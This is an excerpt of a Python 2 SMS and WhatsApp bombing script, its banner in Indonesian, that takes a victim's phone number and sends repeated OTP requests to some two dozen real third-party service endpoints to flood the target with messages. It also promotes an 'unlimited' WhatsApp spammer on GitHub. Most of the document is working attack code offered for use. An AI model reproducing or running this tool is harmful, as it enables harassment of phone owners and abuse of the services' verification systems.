...
#--------------------------------MAIN---------------------------------------------------
def main():
  print "%s[%s!%s] %sTarget locked >> %s%s"%(pu,me,pu,pu,ku,"+66"+nom)
  t = 1
...
def logo():
 ...
 ||==||\=====|| ||====//=||========||=||******||=||======||==||
     ...
     ||  \\  || ||///    ||//    \\||/||      || ||      ||  ||
 !!==============//=================//=========================
                 ++++++++++         ************               %sTools spam sms dan telp dengan 29 spammers"""%(th,pu,ku,qu,pu,ku,qu,pu,ku,qu,qu)
#-------------------------------Input Function------------------------------------------
def input():
  global nom
  ...
  if len(nom) < 5:
    ...
    input()
  elif nom.startswith(tuple(["66","+66","0"])):
    print "%s[%s!%s] %sMasukkan nomor tanpa 66, +66, ataupun 0\n%s[%s!%s] %sContoh : 666785649890"%(pu,me,pu,ku,pu,me,pu,ku)
    input()
  else:
    global jum
...
def asakita():
  ...
  if 'MOBILE' in h:
   ...
   gagal("1","sms","asakita")
def sunchila():
#  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=66")
...
def asani():
  j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"66"+nom,"email":"akuntesnuyul@gmail.com"}))
  if json.loads(j.text)["message"] == 'OTP Terkirim ':
   sukses("4","sms","asani")
  else:
   gagal("4","sms","asani")
def wintershop():
 #dat=json.dumps(["66"+nom,"Winter Shop","",""])
...
def datesy():
# to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'66','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
...
def jumpstart():
 dat=json.dumps({"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+66"+nom},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"})
...
def klikwa():
 ...
 if json.loads(tes.text)["message"] == 'OTP Sent':
  print "     %s[%s%s%s] [%s Sent %s] %sSuccess, spam %s from %s%s %ssended %s>> %sMau yang unlimited? %shttps://github.com/AbilSeno/WaUnlimitedV3"%(pu,ku,"10",th,hi,pu,pu,"wa",ku,"klikwa",hi,qu,pu,ku)
 else:
  print "     %s[%s%s%s] [%s Failed %s] %sFailed, spam %s from %s%s %snot sended %s>> %sMau yang unlimited? %shttps://github.com/AbilSeno/WaUnlimitedV3"%(th,ku,"10",pu,me,pu,pu,"wa",ku,"klikwa",me,qu,pu,ku)
def bakmikeraton():
...
'X-Requested-With':'com.uf7c21.uangpintar.w465ae'
 ...
 pis=requests.post("http://www.uangpintar.id:7092/up/sms_login/vcode",headers=hd,data={'phone':nom,'code':'66'})
...
'X-Requested-With':'com.ecreditpal.tropic2'
 ...
 hu=requests.post("https://www.kreditpedia.co.id:8089/tropic/sms_login/vcode",headers=hd,data={'phone':nom,'code':'66'})
 if json.loads(hu.text)["desc"] == 'Success':
  sukses("22","sms","kreditpedia")
 else:
  gagal("22","sms","kreditpedia")
def bocil():
 dat={'user_id':'','language':'in','phone':'66'+nom,'device_id':'590bc36d99d6dddb','retry':'0'}
...
def duitqu():
 ...
 sukses("24","sms","duiqu")
def primacash():
# uhu = requests.post("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=json.dumps({'phone':'66'+nom})).text
# if json.loads(uhu)["success"] == True:
  sukses("25","sms","primacash")
 #else:
  #gagal("26","sms","primacash")
def temanprima():
# dat=json.dumps({"phone":"66"+nom,"place":"google","phone_brand":"vivo","phone_model":"vivo 1902","device_id":"590bc36d99d6dddb"})
